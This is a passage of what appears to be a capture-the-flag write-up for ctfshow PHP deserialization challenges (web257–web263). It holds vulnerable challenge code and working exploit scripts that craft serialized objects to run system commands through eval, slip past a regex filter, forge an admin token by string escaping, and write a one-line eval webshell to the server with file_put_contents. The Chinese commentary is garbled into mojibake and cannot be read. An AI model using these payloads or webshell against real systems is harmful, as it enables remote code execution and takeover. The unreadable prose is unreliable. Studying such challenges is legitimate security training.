class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/Jeff_12138/article/details/124815338">https://blog.csdn.net/Jeff_12138/article/details/124815338</a></p>
<p><a href="https://segmentfault.com/a/1190000007250604">https://segmentfault.com/a/1190000007250604</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123; <span class="comment">//__constructï¼šå®ä¾‹åŒ–å¯¹è±¡æ—¶è¢«è°ƒç”¨ï¼Œå…¶ä½œç”¨æ˜¯æ‹¿æ¥åˆå§‹åŒ–ä¸€äº›å€¼ã€‚</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>()));</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 21:38:56</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ­£åˆ™è¿‡æ»¤[<a href="https://so.csdn.net/so/search?q=oc&spm=1001.2101.3001.7020">oc</a>]æ˜¯åŒ¹é…oå­—ç¬¦æˆ–è€…cå­—ç¬¦ï¼Œ\dåŒ¹é…ä¸€ä¸ªæ•°å­—å­—ç¬¦ï¼Œç­‰ä»·äº[0-9]ï¼Œ+å·æ˜¯åŒ¹é…å‰é¢çš„\dä¸€æ¬¡æˆ–è€…å¤šæ¬¡ã€‚ä¸‹é¢åªéœ€è¦å°†O:11å˜æˆO:+11å°±å¯ä»¥ç»•è¿‡äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class"> &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;system(&#x27;tac f*&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;O:&quot;</span>,<span class="string">&quot;O:+&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>

<h2 id="web259åŸç”Ÿç±»åˆ©ç”¨æœªå†™"><a href="#web259åŸç”Ÿç±»åˆ©ç”¨æœªå†™" class="headerlink" title="web259åŸç”Ÿç±»åˆ©ç”¨æœªå†™"></a>web259åŸç”Ÿç±»åˆ©ç”¨æœªå†™</h2><p>ä¸ä¼š&#96;</p>
<h2 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>])))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ååºåˆ—åŒ–åå«æœ‰ctfshow_i_love_36D</p>
<p>ç›´æ¥getä¼ å‚ctfshow_i_love_36Då³å¯</p>
<p>ctfshow{95f2cc54-4c24-4de1-a5ef-8bc52a47a174}</p>
<h2 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable language_">$this</span>-&gt;username.<span class="variable language_">$this</span>-&gt;password; </span><br><span class="line">    &#125; <span class="comment">//code èµ‹å€¼code=username</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;  <span class="comment">//å¼±ç±»å‹æ¯”è¾ƒcode=877+å­—ç¬¦</span></span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__sleep()	 	//ä½¿ç”¨serializeï¼ˆï¼‰æ—¶è§¦å‘ </span><br><span class="line">__destruct() 	//å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘ï¼Œåœ¨è„šæœ¬ç»ˆæ­¢æˆ–å¯¹è±¡å¼•ç”¨è®¡æ•°ä¸º0æ—¶è°ƒç”¨ï¼Œé€šå¸¸ä¼šæ‰§è¡Œæ•°æ®æ¸…é™¤å°±æˆ–è¿æ¥æ–­å¼€æ“ä½œ </span><br><span class="line">__call() 		//åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ ï¼Œé€šå¸¸ç”¨äºé”™è¯¯å¤„ç†ï¼Œé˜²æ­¢è„šæœ¬å› ä¸ºè°ƒç”¨é”™è¯¯è€Œç»ˆæ­¢æ‰§è¡Œ</span><br><span class="line">__callStatic() 	//åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ </span><br><span class="line">__get() 		//ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®ï¼Œé€šå¸¸ç”¨äºè®¾ç½®å’Œè·å–å¯¹è±¡ç§æœ‰å±æ€§</span><br><span class="line">__set() 		//ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§ï¼Œé€šå¸¸ç”¨äºè®¾ç½®å’Œè·å–å¯¹è±¡ç§æœ‰å±æ€§</span><br><span class="line">__isset() 		//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘ </span><br><span class="line">__unset() 		//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘ </span><br><span class="line">__invoke() 		//å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span><br><span class="line">__clone()       //å½“æŠŠä¸€ä¸ªå¯¹è±¡èµ‹ç»™å¦ä¸€ä¸ªå¯¹è±¡æ—¶è‡ªåŠ¨è°ƒç”¨</span><br><span class="line">__wakeup()		//unserializeå‡½æ•°ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨wakeupæ–¹æ³•ï¼Œå¦‚æœå­˜åœ¨åˆ™å…ˆè°ƒç”¨wakeupæ–¹æ³•ï¼Œåšä¸€äº›å¿…è¦çš„åˆå§‹åŒ–è¿æ•°æ®åº“ç­‰æ“ä½œ</span><br><span class="line">__construct() 	//PHP5å…è®¸åœ¨ä¸€ä¸ªç±»ä¸­å®šä¹‰ä¸€ä¸ªæ–¹æ³•ä½œä¸ºæ„é€ å‡½æ•°ã€‚å…·æœ‰æ„é€ å‡½æ•°çš„ç±»ä¼šåœ¨æ¯æ¬¡åˆ›å»ºæ–°å¯¹è±¡æ—¶å…ˆè°ƒç”¨æ­¤æ–¹æ³•</span><br><span class="line">__destruct()	  //PHP5å¼•å…¥ææ„å‡½æ•°çš„æ¦‚å¿µï¼Œææ„å‡½æ•°ä¼šåœ¨åˆ°æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œ</span><br><span class="line">__toString()	  //ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”ã€‚ä¾‹å¦‚ echo $obj; åº”è¯¥æ˜¾ç¤ºäº›ä»€ä¹ˆã€‚æ­¤æ–¹æ³•å¿…é¡»è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦åˆ™å°†å‘å‡ºä¸€æ¡ E_RECOVERABLE_ERROR çº§åˆ«çš„è‡´å‘½é”™è¯¯</span><br></pre></td></tr></table></figure>

<p>file_put_contents â€” å°†æ•°æ®å†™å…¥æ–‡ä»¶</p>
<p>å¦‚æœ <code>filename</code>   ä¸å­˜åœ¨ï¼Œå°†ä¼šåˆ›å»ºæ–‡ä»¶ã€‚åä¹‹ï¼Œå­˜åœ¨çš„æ–‡ä»¶å°†ä¼šé‡å†™ï¼Œé™¤éè®¾ç½®   <strong><code>FILE_APPEND</code></strong> flagã€‚  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshowvip</span>(<span class="string">&#x27;877.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//urlç¼–ç ä¸€ä¸‹getä¼ å‚</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¸€å¥è¯æœ¨é©¬</p>
<p>è¿æ¥url&#x2F;877.php</p>
<p>æ‰§è¡Œ1&#x3D;system(â€œls &#x2F;â€œ);</p>
<p>å‘ç°ctfshow{64baf76c-41a0-4795-922a-17076ed94eb2}</p>
<h2 id="web262-å­—ç¬¦ä¸²é€ƒé€¸"><a href="#web262-å­—ç¬¦ä¸²é€ƒé€¸" class="headerlink" title="web262 å­—ç¬¦ä¸²é€ƒé€¸"></a>web262 å­—ç¬¦ä¸²é€ƒé€¸</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class message&#123;</span><br><span class="line">    public $from;</span><br><span class="line">    public $msg;</span><br><span class="line">    public $to;</span><br><span class="line">    public $token=&#x27;user&#x27;;</span><br><span class="line">    public function __construct($f,$m,$t)&#123;</span><br><span class="line">        $this-&gt;from = $f;</span><br><span class="line">        $this-&gt;msg = $m;</span><br><span class="line">        $this-&gt;to = $t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$f = $_GET[&#x27;f&#x27;];</span><br><span class="line">$m = $_GET[&#x27;m&#x27;];</span><br><span class="line">$t = $_GET[&#x27;t&#x27;];</span><br><span class="line">if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t))&#123;</span><br><span class="line">    $msg = new message($f,$m,$t);</span><br><span class="line">    $umsg = str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, serialize($msg));</span><br><span class="line">    setcookie(&#x27;msg&#x27;,base64_encode($umsg));</span><br><span class="line">    echo &#x27;Your message has been sent&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>

<p>è®¿é—®url&#x2F;message.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">class message&#123;</span><br><span class="line">    public $from;</span><br><span class="line">    public $msg;</span><br><span class="line">    public $to;</span><br><span class="line">    public $token=&#x27;user&#x27;;</span><br><span class="line">    public function __construct($f,$m,$t)&#123;</span><br><span class="line">        $this-&gt;from = $f;</span><br><span class="line">        $this-&gt;msg = $m;</span><br><span class="line">        $this-&gt;to = $t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_COOKIE[&#x27;msg&#x27;]))&#123;</span><br><span class="line">    $msg = unserialize(base64_decode($_COOKIE[&#x27;msg&#x27;]));</span><br><span class="line">    if($msg-&gt;token==&#x27;admin&#x27;)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ„é€ åºåˆ—åŒ–</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">class message&#123;</span><br><span class="line"> </span><br><span class="line">public $token=&#x27;admin&#x27;;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$a=new message();</span><br><span class="line"> </span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f=1&amp;m=1&amp;t=1fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="web263sessionååºåˆ—åŒ–æ¼æ´"><a href="#web263sessionååºåˆ—åŒ–æ¼æ´" class="headerlink" title="web263sessionååºåˆ—åŒ–æ¼æ´"></a>web263sessionååºåˆ—åŒ–æ¼æ´</h2><p><a href="https://www.jb51.net/article/116246.htm">æ·±å…¥æµ…æPHPçš„sessionååºåˆ—åŒ–æ¼æ´é—®é¢˜_phpå®ä¾‹_è„šæœ¬ä¹‹å®¶ (jb51.net)</a></p>
<p><a href="https://www.cnblogs.com/meng-han/p/16851760.html">ctfshow web263(PHPçš„sessionååºåˆ—åŒ–æ¼æ´) - hithub - åšå®¢å›­ (cnblogs.com)</a></p>
<p>ç”¨dirsearchæ‰«ä¸€ä¸‹ï¼Œå‘ç°<a href="http://www.zipæ–‡ä»¶,è®¿é—®ä¸‹è½½ä¸‹æ¥æ˜¯ç½‘ç«™æºç ./">www.zipæ–‡ä»¶ï¼Œè®¿é—®ä¸‹è½½ä¸‹æ¥æ˜¯ç½‘ç«™æºç ã€‚</a></p>
<p>index.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	error_reporting(0);</span><br><span class="line">	session_start();</span><br><span class="line">	//è¶…è¿‡5æ¬¡ç¦æ­¢ç™»é™†</span><br><span class="line">	if(isset($_SESSION[&#x27;limit&#x27;]))&#123;</span><br><span class="line">		$_SESSION[&#x27;limti&#x27;]&gt;5?die(&quot;ç™»é™†å¤±è´¥æ¬¡æ•°è¶…è¿‡é™åˆ¶&quot;):$_SESSION[&#x27;limit&#x27;]=base64_decode($_COOKIE[&#x27;limit&#x27;]);</span><br><span class="line">		$_COOKIE[&#x27;limit&#x27;] = base64_encode(base64_decode($_COOKIE[&#x27;limit&#x27;]) +1);</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		 setcookie(&quot;limit&quot;,base64_encode(&#x27;1&#x27;));</span><br><span class="line">		 $_SESSION[&#x27;limit&#x27;]= 1;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>check.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">require_once &#x27;inc/inc.php&#x27;;</span><br><span class="line">$GET = array(&quot;u&quot;=&gt;$_GET[&#x27;u&#x27;],&quot;pass&quot;=&gt;$_GET[&#x27;pass&#x27;]);</span><br><span class="line">if($GET)&#123;</span><br><span class="line"></span><br><span class="line">	$data= $db-&gt;get(&#x27;admin&#x27;,</span><br><span class="line">	[	&#x27;id&#x27;,</span><br><span class="line">		&#x27;UserName0&#x27;</span><br><span class="line">	],[</span><br><span class="line">		&quot;AND&quot;=&gt;[</span><br><span class="line">		&quot;UserName0[=]&quot;=&gt;$GET[&#x27;u&#x27;],</span><br><span class="line">		&quot;PassWord1[=]&quot;=&gt;$GET[&#x27;pass&#x27;] //å¯†ç å¿…é¡»ä¸º128ä½å¤§å°å†™å­—æ¯+æ•°å­—+ç‰¹æ®Šç¬¦å·ï¼Œé˜²æ­¢çˆ†ç ´</span><br><span class="line">		]</span><br><span class="line">	]);</span><br><span class="line">	if($data[&#x27;id&#x27;])&#123;</span><br><span class="line">		//ç™»é™†æˆåŠŸå–æ¶ˆæ¬¡æ•°ç´¯è®¡</span><br><span class="line">		$_SESSION[&#x27;limit&#x27;]= 0;</span><br><span class="line">		echo json_encode(array(&quot;success&quot;,&quot;msg&quot;=&gt;&quot;æ¬¢è¿æ‚¨&quot;.$data[&#x27;UserName0&#x27;]));</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		//ç™»é™†å¤±è´¥ç´¯è®¡æ¬¡æ•°åŠ 1</span><br><span class="line">		$_COOKIE[&#x27;limit&#x27;] = base64_encode(base64_decode($_COOKIE[&#x27;limit&#x27;])+1);</span><br><span class="line">		echo json_encode(array(&quot;error&quot;,&quot;msg&quot;=&gt;&quot;ç™»é™†å¤±è´¥&quot;));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;display_errors&#x27;, 0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span><br><span class="line">date_default_timezone_set(&quot;Asia/Shanghai&quot;);</span><br><span class="line">session_start();</span><br><span class="line">class User&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public $status;</span><br><span class="line">    function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    function setStatus($s)&#123;</span><br><span class="line">        $this-&gt;status=$s;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;ä½¿ç”¨&quot;.$this-&gt;password.&quot;ç™»é™†&quot;.($this-&gt;status?&quot;æˆåŠŸ&quot;:&quot;å¤±è´¥&quot;).&quot;----&quot;.date_create()-&gt;format(&#x27;Y-m-d H:i:s&#x27;));</span><br><span 